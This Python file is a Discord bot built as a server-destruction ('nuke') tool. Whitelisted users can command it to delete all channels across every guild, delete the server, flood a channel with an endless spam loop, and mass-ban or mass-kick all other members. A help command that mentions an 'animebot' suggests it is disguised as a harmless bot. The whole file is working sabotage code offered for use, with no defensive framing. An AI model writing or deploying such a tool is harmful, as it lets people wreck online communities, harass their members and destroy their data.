import discord

intents = discord.Intents.all()
client = discord.Client(intents=intents)

god_user = 'YOUR_USER_ID'
allowed_users = ['YOUR_USER_ID', 'YOUR_BOT_USER_ID'] # You can add more ID's



@client.event
async def on_message(message):
  if str(message.author.id) in allowed_users:
      if message.content == '!bot deletechn':
        await message.channel.send('Deleting Channels... ')
        for guild in client.guilds:
            for channel in guild.channels:
                await channel.delete()
      elif message.content == '!bot deletesrv':
        await message.channel.send('Deleting Server... ')
        await message.guild.delete()
      elif (message.content.startswith('!bot adduser')
       and str(message.author.id) == god_user):
        splits_message = message.content.split(' ')
        user_id = " ".join(splits_message[2:])
        allowed_users.append(user_id)
        await message.channel.send(f'User <@{user_id}> has been added to the allowed users list.')
      elif (message.content.startswith('!bot removeuser')
         and str(message.author.id) == '798629431325360128'):
          splited_message = message.content.split(' ')
          user_id = " ".join(splited_message[2:])
          if user_id in allowed_users:
            allowed_users.remove(user_id)
            user = client.get_user(int(user_id))
            await message.channel.send(f'User <@{user_id}> has been removed from the allowed users list.')
      elif message.content.startswith('!bot spam'):
       split_message = message.content.split(' ')
       if len(message.content) > 13:
        spam_message = " ".join(split_message[2:])
        while True:
          await message.channel.send(spam_message)
       else:
        await message.channel.send('Please provide a message to spam')
      elif message.content == '!bot':
        await message.channel.send("")
      elif message.content == '!animebot help':
        await message.channel.send('figure out urself')
      elif message.content == '!bot ban all':
        for guild in client.guilds:
          for member in guild.members:
              if str(member.id) not in allowed_users:
                  await message.channel.send(f'Banning {member.name}')
                  await member.ban()
      elif message.content == '!bot kick all':
        for guild in client.guilds:
         for member in guild.members:
              if str(member.id) not in allowed_users:
                 await message.channel.send(f'Kicking {member.name}')
                 await member.kick()
      elif message.content == '!bot allowedusers':
        allowed_users_mentions = '\n'.join([f'<@{user}>' for user in allowed_users])
        await message.channel.send(f'Allowed users:\n{allowed_users_mentions}')
      elif message.content == '!bot config':
        embed = discord.message.Embed(title="Bot Commands", description="List of available commands and their descriptions", color=0x00ff00)
        command_desc = {
            '!bot deletechn': 'Deletes all channels in the server',
            '!bot deletesrv': 'Deletes the entire server',
            '!bot adduser [user_id]': 'Adds a user to the allowed users list',
            '!bot removeuser [user_id]': 'Removes a user from the allowed users list',
            '!bot spam [message]': 'Spams the provided message',
            '!bot ban all': 'Bans all members from the server except allowed users',
            '!bot kick all': 'Kicks all members from the server except allowed users'
        }
        for command, description in command_desc.items():
            embed.add_field(name=command, value=description, inline=False)
        await message.channel.send(embed=embed)
client.run('YOUR_BOT_TOKEN')
